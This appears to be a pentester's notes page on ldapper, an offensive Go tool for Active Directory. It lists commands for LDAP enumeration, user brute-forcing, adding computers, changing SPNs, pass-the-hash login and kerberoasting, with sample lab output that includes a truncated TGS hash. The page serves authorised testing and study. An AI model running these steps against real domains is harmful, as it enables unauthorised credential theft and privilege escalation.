---
title : "ldapper"
# pre : ' '
description : "A GoLang tool to enumerate and abuse LDAP. Made simple."
date : 2022-09-25T12:59:17+02:00
# hidden : true
# draft : true
weight : 1040
tags : ['Other', 'LDAP', 'Active Directory']
---

---

A GoLang tool to enumerate and abuse LDAP. Made simple.

Ldapper was created with for use in offensive security engagements for user enumeration, group enumeration, and more. Ldapper uses familiar "net" commands such as "net user" and "net group" to perform all its queries and its output follows the same conventions. Ldapper's user interface operates as a interactive shell, where the user can input commands until exited. All traffic goes over the LDAP(S) protocol with a singular bind to help you better blend into the network. Ldapper is proxy aware and supports NTLM authentication with a user's hash. Additionally, this tool can perform modification actions within LDAP.

Ldapper is proxy aware and supports NTLM authentication with a user's hash. Additionally, this tool can perform modification actions within LDAP. More functionality is planned for later releases, but for now additional supported command functions are:

This tool should be considered in its beta stages. Please report any bugs, issues, or functionality ideas for future releases.

## Installation

```plain
git clone https://github.com/Synzack/ldapper
go mod tidy
go build
```

## Usage

```plain
./ldapper [command]
```

## Flags

```plain
Initialize/Deinitialize:
  connect     Connect to a LDAP server
  disconnect  Close the LDAP connection

Ldapper Commands:
  addComputer  Add a computer to the domain
  roast        Kerberoast a user with an SPN
  spn          Add or remove a SPN on a user account

Ldapper Enumeration:
  brute  Brute force users from a file. No authentication needed.

Ldapper Queries:
  dacl     Query the DACL of a target object
  getspns  Query all user accounts with an SPN
  groups   Query the groups for a target user
  mquota   Query the machine account quota of the domain
  net      Run net commands
  passpol  Query the password policy of the domain

Flags:
  -h, --help        display help
      --nocolor     disable color output
```

## Examples

### Setting up connection

NOTE: `-s` enables LDAP**S** instead of LDAP. LDAP by default is TCP based but Microsoft tend to use UDP for LDAP. LDAP**S** is TCP.

Optional flags:

- `-t` - Enable timestamps for each command performed
- `-s` - Enable the use of LDAP**S**

With Password:  `connect -u <username@domain> -p <password> -d <ip/FQDN>`

With Hash:      `connect -u <username@domain> -H <hash> -d <ip/FQDN>`

With Kerberos:  `connect -u <username@domain> -k -d <ip/FQDN>`

### Starting LDAP-shell session running 'net user'

```plain
crypt0rr@10.10.20.52:389 » net user administrator

User Information - administrator:
-------------------------------------------------------------------------------
User Name:              Administrator
Full Name:              Administrator
Comment:                Built-in account for administering the computer/domain
User Account Control:   USER_NORMAL_ACCOUNT
                        USER_DONT_EXPIRE_PASSWORD
                        (If Enabled, Check Last Lockout Time)
Last Lockout Time: 
Account Expires:        Never
Password Last Set:      12/23/2022 12:40:26 PM
Home Directory: 
Last Logon:             04/04/2023 05:57:05 PM
Logon Count:            70
Mail: 
SPN(s): 
```

### Retrieve ms-DS-MachineAccountQuota

```plain
crypt0rr@10.10.20.52:389 » mquota
Machine Account Quota: 10
```

### Checking password policy

```plain
crypt0rr@10.10.20.52:389 » passpol

Minimum Password Length:        7
Password History Length:        24
Lockout Threshold:              0
Lockout Duration:               10      minutes
Reset Account Lockout Counter:  10      minutes
Minimum Password Age:           1       day(s)
Maximum Password Age:           42      day(s)

Password Complexity:            DOMAIN_PASSWORD_COMPLEX
```

### Retrieve group members 'net group'

```plain
crypt0rr@10.10.20.52:389 » net group "Domain Admins"
Comment: Designated administrators of the domain

Primary Group Members
-------------------------------------------------------------------------------
NestedDAGroup (Group)           QUINN_NASH              ERNIE_GUTHRIE
DAMIAN_DUFFY                    GARTH_HARRINGTON        ALI_SANCHEZ
Administrator
```

A nested group is visible by the `(Group)` naming. To retrieve the members of this nested group use `net nestedGroups`.

```plain
crypt0rr@10.10.20.52:389 » net nestedGroups NestedDAGroup
Comment: 

Primary Group Members
-------------------------------------------------------------------------------
crypt0rr-adm             TANNER_ALSTON            BRANDON_LYNCH  
```

### Get list of SPNs and perform kerberoasting

```plain
crypt0rr@10.10.20.52:389 » getspns
SPN                     Username                PasswordLastSet                 LastLogon       Delegation
CIFS/AWSWVIR1000000     HAL_MURRAY              2022-07-04 15:27:52 +0200 CEST  <never>
CIFS/FINWWKS1000000     MYRON_FORD              2022-07-04 15:26:44 +0200 CEST  <never>
CIFS/TSTWDBAS1000000    SHIRLEY_RANDALL         2022-07-04 15:26:37 +0200 CEST  <never>
CIFS/TSTWVIR1000000     TANYA_DEJESUS           2022-07-04 15:19:32 +0200 CEST  <never>
ftp/AWSWAPPS1000000     HEATH_PATTON            2022-07-04 15:20:44 +0200 CEST  <never>
ftp/AWSWSECS1000000     ANGEL_WORKMAN           2022-07-04 15:25:28 +0200 CEST  <never>
ftp/BDEWWKS1000001      DIANNA_KIRBY            2022-07-04 15:27:31 +0200 CEST  <never>
ftp/FINWLPT1000003      MARVA_CLARK             2022-07-04 15:23:10 +0200 CEST  <never>
ftp/FINWWEBS1000001     RICKIE_RUSSO            2022-07-04 15:20:00 +0200 CEST  <never>
ftp/GOOWLPT1000001      ABE_MASON               2022-07-04 15:23:37 +0200 CEST  <never>
```

Roasting supports both RC4 and AES.

```plain
crypt0rr@10.10.20.52:389 » roast rc4 BERRY_TRAVIS
$krb5tgs$23$*BERRY_TRAVIS$OFFSEC.NL$BERRY_TRAVIS*$1eacfa05b0737825dcc664fabf2a8696$9bb5ddda4f021dcc414a67f768c5f06916c344c566769805f532dcd[...]
```

## URL List

- [Github.com - ldapper](https://github.com/Synzack/ldapper)
